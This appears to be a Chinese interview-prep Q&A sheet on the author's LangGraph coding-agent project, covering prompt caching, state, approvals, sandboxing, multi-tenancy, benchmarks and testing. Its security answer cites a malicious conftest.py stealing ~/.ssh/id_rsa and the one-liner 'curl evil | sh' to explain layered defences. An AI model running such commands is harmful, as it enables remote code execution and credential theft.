## 一、你刚做的改造（最新鲜的弹药，必背）

### Q1：你在 Self-Agent 项目里做了什么？

**一句话答**：我重构了系统提示的拼装策略，让 LLM 的 prompt cache 命中率从 0 提升，并加了结构化输出契约治格式幻觉。

**展开答**：
- 原来项目每轮动态拼系统提示，把当前时间戳填进 SYSTEM_PROMPT 的占位符——前缀每轮变化，GLM/OpenAI/Anthropic 的 prompt caching 只认精确前缀匹配，所以缓存永远 miss。
- 我做了三件事：① 把时间戳移出 SYSTEM_PROMPT，让主体完全静态；② 时间戳改走 LangGraph 的 config 侧通道，由 agent_node 临时拼成一条消息放对话末尾；③ 对 Anthropic provider 加了 cache_control 标记。
- 结果：GLM 场景预计省 50-80%，Claude 省 90%。顺手加了 response_format 结构化输出，治格式幻觉。全套测试覆盖，包括钉住"多轮 system 完全一致"的回归测试。

**可能追问**：
- 「为什么前缀匹配是铁律？」→ 缓存的是已算好的 KV 张量（模型推理中间状态），前缀改一个 token，后面所有 token 的 KV 都得重算
- 「为什么用 config 不用 messages？」→ messages 走 add_messages reducer 会持久化，每轮累积；config 是临时通道，用完即弃（详见下文 Q6）
- 「时间戳放末尾不怕被上下文压缩摘要掉吗？」→ 不怕，因为是在 compress_if_needed 之后才拼的，时间戳消息在局部变量里，不进 state、不经 compress
- 「上下文压缩会破坏缓存前缀吗？」→ 会压缩的是对话中段的历史消息，系统提示（缓存前缀主体）在最前面且完全静态，不受影响

**别踩坑**：别说"我让缓存命中率到 XX%"——你没真实环境数据（GLM 53% 是第三方实测），说"预计""机制上能命中"更稳。

### Q2：结构化输出治幻觉，具体治什么？

**一句话答**：治**格式幻觉**（JSON 拼错、字段缺失），不治**内容幻觉**（编造的值）。

**展开答**：
- 结构化输出（response_format = JSON Schema）约束 LLM 的输出必须在合法结构内，保证程序能消费。
- 但「一个语法合法的 JSON 仍可能含编造的 order_id」——它治格式不治内容。内容幻觉要靠 RAG grounding、citation、critic 互验。
- 我在 models.py 的 ChatRequest 加了 response_format 字段，透传到 OpenAI 兼容 provider，用在 A2A 委托返回结构化结果的场景。

**可能追问**：
- 「那内容幻觉怎么治？」→ RAG（baseline）+ CRAG 检索兜底 + 多 Agent critic 互验 + CoVe 反思（[书⑥第 1 章](../06-进阶技术/01-幻觉.md)）

**别踩坑**：别把"结构化输出"说成"解决幻觉的银弹"——面试官会追问内容幻觉。

## 二、Agent 核心机制（必问，深挖最多）

### Q3：ReAct 是什么？你的项目怎么实现的？

**一句话答**：ReAct 是 Reason + Act 的循环——大模型思考下一步、调工具、看结果、再思考。我用 LangGraph 把它描述成两个节点（agent / tools）+ 条件路由。

**展开答**（[书1第 1 章](../01-全书/01-从一句话开始.md)）：
- 大模型不调用工具，它只输出结构化的 JSON 描述"想调用什么"，程序解析执行。
- 我的图：START → agent 节点（问大模型）→ 条件路由 should_use_tools（有 tool_calls 去 tools 节点，没有就 END）→ tools 节点执行 → 回 agent。整个骨架十几行（graph.py:306）。
- 循环最多转 AGENT_RECURSION_LIMIT 次，防死循环。

**可能追问**：
- 「为什么用图不用 while 循环？」→ while 要自己实现状态持久化、中断恢复、流式；LangGraph 用图抽象打包提供这些（[书1第 4 章](../01-全书/04-LangGraph与状态图.md)）
- 「条件路由怎么判断的？」→ 看最后一条消息有没有 tool_calls，一行 if-else

**别踩坑**：别说"大模型调用工具"——要说"大模型输出调用意图，程序执行"。

---

### Q4：★ State 存的是什么？message 是原文还是摘要？

**一句话答**：State 存 messages（对话历史）+ plan（任务计划），都是**原文，逐字保留**，不是摘要。

**展开答**（[书1第 3 章](../01-全书/03-状态的真相.md)，这是你最该背的一题）：
- messages 是 LangChain 消息对象的列表，四种角色：HumanMessage（用户原话）、AIMessage（模型回复 + tool_calls）、ToolMessage（工具执行结果原文，但写入前会截断到 TOOL_RESULT_MAX_CHARS）、SystemMessage（系统提示，但**不进持久化的 state**，每轮临时拼）。
- agent 怎么"记住"上文？不是 LLM 记，是**每次调用 LLM 时把完整历史 messages 塞进输入**。LLM 每次都是无状态地看到全部历史。
- 摘要只发生在上下文超长时（context_manager），且只临时压缩给 LLM 看，**持久化的仍是原文**。
- 摘要本身带 **per-thread 缓存 + 迟滞窗口**：新积累的早期消息不足 6 条直接复用旧摘要，攒够了才做一次增量摘要（旧摘要+新消息合并）——否则长会话每轮、ReAct 循环每次回 agent 都多一次摘要 LLM 调用。边界用消息 id 校验，会话重置自动失效。

**可能追问**：
- 「系统提示为什么不存在 state？」→ add_messages 是追加语义，存进去每轮多一条，第 N 轮有 N 份系统提示，token 平方增长（项目历史上踩过，有回归测试钉住）
- 「存哪？」→ 本地模式 SQLite（按工作区路径哈希分库），服务端 Postgres，兜底内存
- 「什么格式？」→ LangGraph 序列化的 blob，非人类可读，要读用 API

**别踩坑**：别说"摘要"——除非你明确说"超长时临时压缩"。原文是核心。

---

### Q5：checkpointer 是什么？怎么实现记忆和中断恢复？

**一句话答**：checkpointer 是 LangGraph 的状态存档机制，每走一步存一次 State，所以能同 thread_id 续接（短期记忆）和 interrupt 挂起后恢复（审批）。

**展开答**（[书1第 4 章](../01-全书/04-LangGraph与状态图.md)）：
- 每个节点跑完、interrupt 挂起时，checkpointer 都把当前 State 序列化存档（默认 MsgPack）。
- 同 thread_id 下次调用，按 thread_id 读回历史，实现多轮记忆。
- 审批 interrupt 时：图挂起、State 完整落盘、事件流结束。用户决策后用 Command(resume=决策) 续跑，LangGraph 从 checkpointer 读回 State，从 interrupt 那行原地继续。

**可能追问**：
- 「中断恢复跨进程吗？」→ 是，因为 State 在 checkpointer（SQLite/Postgres）里，不依赖进程存活
- 「踩过什么坑？」→ 拿到 approval_required 事件就 break 会让中断状态来不及写进 checkpointer，之后 resume 什么也不做（项目有测试钉住）

**别踩坑**：别说"LLM 记得"——要说"程序替它保管历史"。

---

### Q6：★ 为什么系统提示走 config 不走 state？

**一句话答**：因为 messages 的 reducer 是 add_messages（追加语义），存进 state 每轮多一条，token 平方增长。

**展开答**：
- 走 config 是"侧通道"，传给节点用完即弃，不进持久化。
- 还有个新理由（你的改造）：config 让动态内容（时间戳）不污染 system prompt 前缀，保住 prompt caching。
- config 和 state 的区别：state 在节点间流转、被 checkpointer 持久化；config 是每次调用临时构造的运行时参数。

**可能追问**：
- 「reducer 是什么？」→ 决定节点返回的变化怎么合并进 state。messages 用 add_messages（追加+去重），plan 用 replace_plan（整份替换）（[书1第 4 章](../01-全书/04-LangGraph与状态图.md)）
- 「为什么 plan 不用 add？」→ update_plan 每次给的是完整最新计划，add 会把历次快照堆一起

## 三、工具与安全（编码 Agent 的核心，必问）

### Q7：工具调用是怎么发生的？风险分级怎么设计的？

**一句话答**：大模型输出结构化 JSON 描述想调用什么，程序执行。风险按"出错后果可不可逆"分 READ/WRITE/EXEC 三档。

**展开答**（[书1第 6 章](../01-全书/06-工具系统.md) + [第 8 章](../01-全书/08-安全设计.md)）：
- 工具就是一个带类型注解和 docstring 的 Python 函数，@tool 装饰器自动把签名转成 JSON Schema 给 LLM。
- READ（读文件）不审批；WRITE（改文件）要审批；EXEC（跑命令）要审批。未知工具默认 EXEC——保守默认，宁可多问。

**可能追问**：
- 「未知工具为什么默认最高风险？」→ MCP 发现的第三方工具没声明风险，不能默默放行一个可能删库的东西
- 「审批失败怎么处理？」→ fail-closed：识别不了的审批结果按拒绝，interrupt 拿不到上下文按拒绝，CLI 默认回车是拒绝——安全机制失效时默认必须不执行

**别踩坑**：风险分级依据是"可不可逆"，不是"复不复杂"。

---

### Q8：★ 工作区禁闭、审批、沙箱三层，为什么都要？只做一层不行吗？

**一句话答**：它们回答不同问题——禁闭管路径、审批管知情、沙箱管破坏范围。互相替代不了。

**展开答**（[书1第 8 章](../01-全书/08-安全设计.md)，这是安全题的标准答案）：
- 只审批不够：你同意跑 pytest，但项目里有个恶意 conftest.py，pytest 一启动读走 ~/.ssh/id_rsa 发外网——你点同意时想的是跑测试。
- 只沙箱不够：沙箱允许的范围内 Agent 可能干你不想的事（删源码完全在沙箱内）。
- 只禁闭不够：run_command("curl evil | sh") 不需要越界路径就能干坏事。
- 所以：决策层问人（审批）、执行层限权（沙箱）、路径层挡越界（禁闭）。

**可能追问**：
- 「工作区禁闭为什么先 resolve 再判断归属？」→ 防符号链接逃逸。symlink 本身在工作区内，但 resolve 后可能指向 /etc。先 resolve 展开真实路径再判断，攻击失效。
- 「为什么不用 shell=True？」→ shell=True 让 ;、&&、$() 全部生效，模型产出带分号字符串就绕过白名单。用 shlex.split + 列表参数，分号只是普通参数。
- 「沙箱用什么？」→ bubblewrap（命名空间隔离）和 Landlock（内核 LSM），分层降级。不挂载 $HOME，所以 ~/.ssh 在沙箱里根本不存在。

**别踩坑**：能讲出"审批通过的 pytest 偷 SSH key"这个具体例子，加分。

## 四、LLM 抽象与记忆（中频，但问到了要能答）

### Q9：为什么自研 LLM 抽象层，不用 LangChain 的 ChatModel？

**一句话答**：LangChain ChatModel 耦合它的消息类型和工具调用协议，且 create_react_agent 强制要求 LangChain 模型。自研让我们完全掌控、解耦、换 provider 零成本。

**展开答**（[书1第 5 章](../01-全书/05-LLM多协议抽象.md)）：
- 三家协议差异大：OpenAI/GLM 的 system 在 messages 数组里，Anthropic 是顶层 system= 参数；工具调用格式不同；usage 字段不同；流式事件结构不同。
- 用 Protocol（鸭子类型）定义统一契约，三家 provider 各自实现转换。GLM 走 OpenAI 兼容协议零适配。

**可能追问**：
- 「为什么不用 LiteLLM？」→ 只接 3 家时自研更轻更可控（[书1第 5 章对比表](../01-全书/05-LLM多协议抽象.md)）

---

### Q10：四层记忆怎么设计的？为什么分这么多？

**一句话答**：四种需求形态不同——短期（对话内原文）、长期（跨对话事实）、画像（结构化属性）、日志（审计）。各用最适合的存储。

**展开答**（[书1第 7 章](../01-全书/07-记忆体系.md)）：
- 短期：checkpointer，按 thread_id，存原文消息
- 长期：Store，按 namespace，语义检索（embedding），跨会话的事实
- 画像：Neo4j 图库，实体-关系（兴趣/偏好）
- 日志：MongoDB，每轮完整事件，写多读少
- 这是多语言持久化——每个存储用在其强项。Neo4j 图遍历每跳 O(1)，关系型 3 跳 JOIN 性能急剧下降。

**可能追问**：
- 「长期记忆怎么检索？」→ embedding 向量化，余弦相似度 top-N，不是关键词匹配（关键词不懂语义）
- 「哈希伪向量为什么只开发用？」→ 字符哈希没语义理解，"猫"和"狗"不会比"猫"和"汽车"更近
- 「为什么画像用 Neo4j？」→ 画像是实体-关系密集型，核心查询是多跳关系遍历，图遍历每跳 O(1)

## 五、协议与系统设计（中频）

### Q11：MCP 和 A2A 的本质区别？

**一句话答**：MCP 是 agent↔工具（工具被动），A2A 是 agent↔agent（双方对等）。互补不互斥。

**展开答**（[书1第 10 章](../01-全书/10-协议层.md) + [书4](../04-拆解-协议/00-总览.md)）：
- MCP 像 USB-C（工具接口），A2A 像 HTTP（服务器互通）。
- 一个 Agent 可同时是 MCP client/server + A2A client/server。
- 我的 Self-Agent 同时扮演五种角色。

**可能追问**：
- 「delegate_to_agent 是 delegate 还是 handoff？」→ delegate（A 不退出，拿结果继续），区别于 OpenAI 的 handoff（A 退出 B 接管）

### Q12：设计一个支持多用户、能记住偏好的 Agent 系统怎么设计？

**一句话答**：（这就是 Self-Agent 的服务端形态）四层记忆 + JWT 多租户隔离 + LangGraph 状态图 + 三种流式契约。

**展开答**：按 [书1第 11 章](../01-全书/11-企业能力.md) 的分层讲：入口层（API/CLI/Web）→ 业务层（认证/会话/统计）→ Agent 编排层（LangGraph）→ 安全层（工作区/审批/沙箱）→ LLM/记忆/工具/协议层 → 数据层（PG/Mongo/Redis/Neo4j）。每层只依赖正下方，认证/租户全在业务层，核心层只认 user_id 字符串。

## 六、性能与容量（2026-08 实测，深挖必背）

> 完整数据见 [性能基准报告](../../04-guides/性能基准报告.md)，优化案例见 [性能优化实录](../../05-interview/optimization-cases.md)。这一节的每个数字都是实测的——面试官最怕背数字的人，最喜欢"我怎么测出来的"。

### Q13：★ 你的 Agent QPS 是多少？怎么测的？

**一句话答**：框架层单 worker 新会话 ~680 rps、长会话 ~475 rps（mock LLM 0ms）；接真实 GLM 后并发 10 只有 2.5 rps——**瓶颈在 provider，不在框架**。

**测法（比数字更重要）**：
- **隔离变量**：mock LLM 零延迟先测框架上限（`scripts/benchmark.py`，进程内 ASGITransport）
- **分场景**：新会话（每请求独立 thread，历史恒 1 轮，稳态开销）vs 长会话（共用 thread，历史随请求增长，含压缩和 checkpoint 开销）——两者差 40%，混着测就解释不了
- **模拟真实延迟**：mock 加 500ms，50 并发下框架只多 ~50-70ms 排队开销 → 事件循环不是瓶颈
- **真实验证**：起真实 uvicorn 走 TCP 测 GLM，e2e p50 ≈ 2.6s、并发 10 得 2.5 rps

**可能追问**：
- 「为什么要 mock LLM？」→ 不 mock 的话测的是 GLM 的速度不是你的框架；mock 后 CPU profile 才能定位框架自身的热点
- 「多 worker 能提到多少？」→ 框架 QPS 线性扩（4 worker ~2000+），但真实瓶颈是 provider 并发额度，先扩 provider 再扩 worker，顺序反了就是白花钱
- 「长会话为什么比新会话慢 40%？」→ checkpoint 全量历史读写 + 上下文压缩判断随历史增长；摘要缓存已把压缩的 LLM 调用降到每 6 条新消息 1 次

### Q14：★ 流式 TTFT 多少？怎么优化首字延迟？

**一句话答**：真实 GLM 流式 TTFT ≈ 1.8s，token 间隔 27ms；TTFT 里框架只占 <15ms，其余全是 provider（网络+排队+prefill）。

**测 TTFT 踩过的坑（能讲出来就是加分项）**：
最初用 httpx 的 `ASGITransport` 进程内测流式，测出 TTFT ≈ 总耗时——**假象**。ASGITransport 会缓冲整个响应体再交给你，token 是"一次性全到"的。测流式必须走**真实 TCP**（起 uvicorn 用 httpx 连 localhost），才能看到 token 一个个到达。

**优化 TTFT 的三件事（已做/可做）**：
- 已做：系统提示静态化命中 prompt caching → prefill 的 KV 重算省掉（前缀命中后 GLM 场景预计省 50-80%）
- 已做：工具 schema 缓存 → 省 CPU 不省 TTFT（CPU 只占 <15ms）
- 可做：换更低延迟模型（flash 档）、prefill 并发额度、首 token 前不压缩（压缩挪到后台）

### Q15：性能优化具体做了什么？怎么发现的？

**一句话答**：压测发现吞吐随并发升高而**下降**（374→234 rps），cProfile 定位到三处"静态数据每请求重算"，加缓存后长会话吞吐 +27%、p50 -33%。

**三处缓存**：
1. **工具 Schema 缓存**：14 个工具的 Pydantic JSON Schema 每次 LLM 调用重算，占热路径 ~18% CPU → 按 (name, description, schema类) 缓存
2. **摘要缓存 + 迟滞**：长会话每轮多 1~2 次摘要 LLM 调用 → per-thread 缓存，攒 6 条新早期消息才做一次**增量摘要**
3. **提示词文件缓存**：每请求同步读盘 → (mtime_ns, size) 校验，写入自动失效

**追问必接的两个深坑**：
- 「缓存怎么保证不过期/不错配？」→ schema 缓存 key 带 schema 类本身，换类自动失效；摘要缓存存边界消息 id，id 对不上（会话重置）就作废全量重摘
- 「踩过什么坑？」→ 第一版 schema 缓存 key 用了 `type(args_schema)`——**所有 Pydantic 模型的元类都是同一个 ModelMetaclass**，缓存永不失效。被我自己写的失效测试当场拦下。教训：**优化必须配失效路径的回归测试**

### Q16：摘要为什么设计成"攒 6 条才更新"？直接每轮重摘不行吗？

**一句话答**：迟滞窗口是在"上下文新鲜度"和"LLM 调用成本"之间取的折中——攒 6 条复用旧摘要（近期暂时多留几条原文），比每轮重摘省 5/6 的摘要调用，信息也没丢（只是晚 6 条并入）。

**展开**：
- ReAct 一轮内 agent 节点可能被调用多次（每次工具返回都回 agent），每轮全量重摘 = 一轮对话多 1~2 次 LLM 调用
- 增量摘要（旧摘要+新消息 → 合并版）比全量重摘 prompt 更短，还保留历史演进
- ToolMessage 边界安全（recent 不能以 ToolMessage 开头，否则配对的 AIMessage 被摘要掉、ReAct 校验失败）在缓存复用路径同样保证
- 参数（20 触发 / 保 10 / 攒 6）目前是经验值，优化路线：按对话日志里的真实 usage 分布回归调参

## 八、流式与中断（高频——前端体验的直接决定者）

### Q18：token 级流式是怎么实现的？SSE 和 NDJSON 为什么两个都要？

**一句话答**：agent_node 声明 `writer: StreamWriter` 参数由 LangGraph 自动注入，每产出一个 token 就 `writer({...})` 推出去；消费端 `graph.astream(stream_mode=["custom","updates"], version="v2")` 同时收自定义事件和节点状态更新；传输层 SSE（`sse_starlette.EventSourceResponse`，浏览器 EventSource 原生支持）和 NDJSON（`StreamingResponse`，CLI/curl 友好）各一个端点，事件格式完全统一。

**展开**：
- 流式纯 ASGI 中间件（不用 BaseHTTPMiddleware）——后者会缓冲响应体，把 token 流变成"最后一刻全到"（项目历史踩过，见优化案例三的测量仪器版）
- **单次流式调用同时拿文本和 tool_calls**：tool_call 跨 chunk 增量在各 provider 的 stream_chat 内按 index 聚合完再吐出（这消灭了早期的"二次采样"双 LLM 调用问题）

**可能追问**：
- 「custom 和 updates 两个 stream_mode 各干嘛？」→ custom 走 writer 通道（token/tool 事件，实时）；updates 走状态更新通道（节点完成后的增量，用来兜底抓最终回复和 usage）
- 「中间件为什么不能用 BaseHTTPMiddleware？」→ 它包住 send 回调会聚合响应体，破坏流式；纯 ASGI 中间件直接透传 message

### Q19：★ 为什么说"流必须消费完，不能中途 break"？

**一句话答**：LangGraph 要等 `astream` **自然结束**才会把 interrupt() 挂起状态写进 checkpointer；客户端拿到 approval_required 就 break 掉流的话，中断状态没落盘，随后 resume_agent 找不到可恢复点——表现为"用户点了同意但什么都没发生"。

**展开**：这是异步生成器生命周期的坑——提前 break 触发 GeneratorExit，LangGraph 的清理逻辑来不及持久化。项目里三重防御：文档注释写明约定（`stream_agent` docstring）、客户端拿到 approval_required 先记下来等流结束再问用户、回归测试钉住该行为。

**可能追问**：
- 「为什么 approval_required 之后不发 done 事件？」→ 这轮还没结束，只是等用户决策；发 done 客户端会以为答完了。也不记对话日志——回复没生成完，记了就是半截历史
- 「resume 怎么找到中断点？」→ `Command(resume=决策)` + 同 thread_id，checkpointer 里有挂起状态就从 interrupt() 原地继续，上下文（含系统提示）还在执行状态里，不重建

### Q20：取消生成怎么做的？为什么不用 asyncio.Task.cancel()？

**一句话答**：协作式取消——`cancel_registry` 维护 thread_id → asyncio.Event 的注册表，流式循环每产出一个事件前检查标志，被取消就提前收尾；不用 Task.cancel() 是因为 LangGraph 的 astream 内部自管任务，外部硬 cancel 不保证干净（状态可能没落盘）。

**展开**：
- `/chat/cancel/{thread_id}` 有**归属校验**：认证用户只能取消自己的会话（先查 session 归属再设标志），否则任何人猜 thread_id 就能打断别人的生成
- 已知限制（诚实答）：注册表是进程内字典，多副本部署下取消请求只有 1/N 概率命中正在跑的那台——README 已知限制里写了，改进方向是 Redis pub/sub 广播取消

**可能追问**：
- 「协作式 vs 抢占式的取舍？」→ 协作式在安全的检查点退出（两个事件之间），状态一致；抢占式（cancel）随时打断，简单但可能打断在"写 checkpoint 一半"这类临界区
- 「取消后客户端收到什么？」→ `{"type": "cancelled"}` 事件，不再发 done；turn span 上记 `selfagent.cancelled=true`

## 九、异步与事件循环（后端基础功，答好直接区分背题党）

### Q21：★ fire-and-forget 任务有什么坑？你怎么处理的？

**一句话答**：Python 的 asyncio 任务**只有弱引用**——`asyncio.create_task(coro)` 之后不保存返回值的话，GC 可能在任务完成前把协程回收掉，任务**静默消失**（不报错、不执行完）。项目的 `_spawn()` 把任务存进模块级强引用集合，`add_done_callback` 完成后自动移出，防泄漏。

**展开**：这个坑在对话日志、Hermes 异步学习、session touch 三处 fire-and-forget 上都会踩——症状是"日志偶尔丢、学习偶尔没跑"，极难排查。强引用集合是最标准的解法（asyncio 官方文档同款建议）。同理的另一个坑：**裸协程不 await 也不会执行**，还会有 RuntimeWarning。

**可能追问**：
- 「为什么日志要 fire-and-forget？」→ 对话日志写 Mongo 属于"最好有"，不能让日志库故障拖慢用户响应；失败在协程内部 try/except 吞掉并告警
- 「强引用集合会不会泄漏？」→ done_callback 在任务结束（含异常）时移除引用，集合只保留在跑的任务；进程退出时无所谓

### Q22：事件循环被阻塞会怎样？项目里怎么防的？

**一句话答**：单事件循环上任何一个同步阻塞调用（同步 HTTP、time.sleep、大 JSON 序列化）都会**串行化所有并发请求**——这正是真实瓶颈之外最常见的"看不见的性能问题"。项目全程 async（AsyncOpenAI/asyncpg/motor/aioredis），已知的三个真实案例都能讲。

**展开**（三个有代码依据的案例）：
1. **同步 LLM client**：若在 async 节点里用同步 `openai.OpenAI`，全部请求串行——所以 LLM 抽象层全部 async 实现
2. **Windows Proactor 坑**：uvicorn 在 Windows 默认 ProactorEventLoop，psycopg 异步不支持它 → Postgres 池初始化失败，静默回退 MemorySaver（首个请求多吃 5s 超时）；Linux/Docker 无此问题
3. **OTel 导出重试**：Jaeger 没起时导出器在后台反复重试，拖慢进程收尾——所以基准脚本默认 OTEL_ENABLED=false

**可能追问**：
- 「怎么发现事件循环被阻塞？」→ 请求 p99 远超 p50 且吞吐不随并发涨；或在 loop 上装 slow-callback 监控（`loop.slow_callback_duration`）；OTel span 里"llm.chat 之外的时间"异常大也是信号
- 「CPU 密集怎么办？」→ 不该在事件循环里做：工具 schema 缓存就是把它从"每请求重算"变成"启动算一次"；真有大计算用 ProcessPoolExecutor

## 十、多租户、认证与限流（企业能力深挖）

### Q23：★ 多租户隔离具体怎么做的？只加个前缀够吗？

**一句话答**：双层隔离——① ID 层：thread_id/user_id 拼 `tenant_id:user_id` 前缀成 scoped id，Postgres 里不同租户的数据物理上就是不同的 key；② 存储层：LangGraph BaseStore 用 namespace 元组 `("tenant", tenant_id, "user", user_id)`，检索时天然查不到别的租户。tenant_id **来自 JWT claims**，不信任请求体——客户端说自己是哪个租户没用。

**展开**：
- 为什么两层都要：前缀防"同库不同租户数据混行"；namespace 是 LangGraph 长期记忆的隔离单位，语义检索时连"相近内容"都不会跨租户泄漏（向量检索在不同 namespace 下进行）
- 记忆注入（top-3）、画像查询、RAG（`("kb", kb_id)`）全部走带租户的入口

**可能追问**：
- 「前缀拼接会不会碰撞？」→ 用分隔符 `:` 且 tenant_id 由系统颁发（UUID），不含分隔符；比"多库多 schema"轻，比"不加"安全
- 「为什么不上 RLS（行级安全）？」→ 可以做（Postgres RLS 按 tenant 列），但应用层隔离先行、够用且可测试；RLS 是纵深防御的下一步
- 「匿名模式（AUTH_ENABLED=false）呢？」→ 所有请求归匿名用户，**会话与记忆在用户间共享**——.env.example 注释里明确警告，只用于裸调试

### Q24：★ 限流器挂了会 fail-open 还是 fail-closed？为什么？

**一句话答**：**fail-open**——Redis 连不上时放行请求并记日志。这个选择和安全机制相反：沙箱/审批是 fail-closed（宁拒勿放）。判断标准是"这个机制保护的到底是什么"。

**展开**（这是本项目安全设计最值得讲的对比）：
- 限流保护的是**可用性配额**（防刷防打爆），挂了顶多失去保护，业务还能服务 → fail-open
- 沙箱/审批保护的是**用户数据安全**（不可逆操作），误放行的代价是不可接受的 → fail-closed：敏感文件保护、命令黑名单、审批解析失败一律按最保守处理（`_parse_decision` 认不出的决策按拒绝）
- 同类决策还有：对话日志失败不阻断响应（日志不是关键路径）；checkpointer 连不上回退内存但要 WARNING（状态丢失可接受？本地调试可以，生产该 fail-fast——所以生产用 STORAGE_BACKEND=postgres 显式指定）

**可能追问**：
- 「限流的具体算法？」→ Redis INCR+EXPIRE 固定窗口计数，豁免 /health、/docs、/auth/login 等基础设施端点；多副本天然共享计数（Redis 居中）
- 「fail-open 的限流器怎么兜底？」→ 网关层（Nginx limit_req）做第二道；应用层日志告警 Redis 不可用

### Q25：JWT 和密码这块有什么细节可以说？

**一句话答**：bcrypt 直用官方库（不依赖已停维的 passlib）、密码超 72 字节显式截断（bcrypt 算法限制，不处理会抛异常）、HS256 + 24h 过期、payload 里预埋 `jti`（token 唯一 id）作为将来吊销名单的锚点——**但吊销未实现**，这是诚实声明的已知限制。

**可能追问**：
- 「为什么不用 passlib？」→ 它长期停维且对新版 bcrypt 有兼容 bug；直用 bcrypt 库反而少一层抽象
- 「改密码/登出怎么办（无吊销）？」→ 短期：把 JWT_EXPIRE_HOURS 调短；正解：jti + Redis 黑名单（token 里锚点已留好），实现量不大
- 「JWT 放哪？」→ HttpOnly Cookie 或 Authorization 头均可；关键是不放 localStorage（XSS 可偷）

## 十一、数据选型、可观测与测试工程

### Q26：为什么用四个数据库？会不会过度设计？

**一句话答**：四个库各管一种数据形态，且**每个都有优雅降级**（连不上只是对应功能退化，不阻断启动）：Postgres 管结构化状态（checkpoint/长期记忆/pgvector 向量）、Redis 管易失缓存与限流计数、Neo4j 管用户画像图（兴趣/偏好是天然图结构）、Mongo 管无 schema 写多读少的对话日志。

**展开**（被追问"为什么不用 X 替代"的答法）：
- 「为什么记忆不用 Mongo？」→ 长期记忆要**向量语义检索**，LangGraph 的 PostgresStore + pgvector 一个库同时管 checkpoint 和记忆，少一个组件
- 「画像为什么必须 Neo4j？」→ 兴趣-偏好-话题是多对多关系，图查询（"喜欢 X 的用户还喜欢什么"）是关系型 SQL 的弱项；且画像不可用时降级为内存字典（`source: memory_fallback` 字段标明来源）
- 「对话日志为什么 Mongo？」→ 每轮事件的字段差异大（有无工具调用/审批/usage），无 schema 最省心；写多读少（审计用）不配得上关系库的事务
- 诚实面：**对个人项目确实偏重**——所以全部可降级、`infra/docker-compose.yml` 一键起、测试黑洞端口 6 秒跑完全套

### Q27：链路追踪怎么设计的？敏感内容怎么处理？

**一句话答**：span 树 `agent.turn → context.build / llm.chat / tool.execute`，命名跟 OpenTelemetry **GenAI 语义约定**（`gen_ai.*` 属性），OTLP 导出到 Jaeger；消息正文默认**不进 trace**——`OTEL_CAPTURE_CONTENT` 开关控制，开了也只记截断后的 prompt/补全（record_content）。

**展开**（讲一个"span 会说话"的实例）：
- span 树形状本身就是诊断工具：**一个 turn 下出现两条 llm.chat span = 双调用退化**（早期"流式出文本+非流式复查"的 bug 就是这么发现的，现已收敛为单次）
- context.build 单独成 span：向量化+检索+图查询的首字延迟大头，从外面看不出卡哪，span 里一目了然（`memory.hits`、`chunk.count` 属性直接给数量）
- async 生成器没有独立 context（PEP 568 未落地），turn span 会"泄漏"到调用方两帧之间——对消费端只做 JSON 序列化无害，且有测试锁住 span 树形状

### Q28：★ 190 条测试怎么做到 6 秒跑完、还绝不碰真实数据库？

**一句话答**：`conftest.py` 在 **import app 之前**把四个数据库的连接指向黑洞端口（127.0.0.1:1，连接立刻被拒而非等超时），再 monkeypatch 短路连接池初始化——测试全跑内存态（MemorySaver + InMemoryStore），既快又从根上断掉"测试数据灌进真实对话历史"的事故。

**展开**：
- 历史事故：对话日志是 fire-and-forget 写 Mongo，本地 .env 指真实库时，测试里"计算 2**10""北京天气"全进了真实历史，用户打开 Web 端看到一堆没问过的问题——所以隔离必须在 conftest（pytest 最先导入）且必须在 import app 前（get_settings 有 lru_cache，读一次定型）
- 黑洞端口 vs 不可解析主机名：前者立刻被拒（快），后者要等 DNS 超时（慢）——细节即性能
- 测试组织三原则：**断言行为而非配置**（沙箱测试真的去读工作区外文件、审批测试真的检查文件有没有被创建）、**优化必须配失效路径的回归测试**（schema 缓存的元类坑就是这么拦下的）、**协议用后端真实吐出的字节做契约测试**（test_client_contract）
- 分层：单元/契约/安全边界/性能回归/端到端冒烟，verify_phaseN.py 脚本供无 pytest 环境快速验证
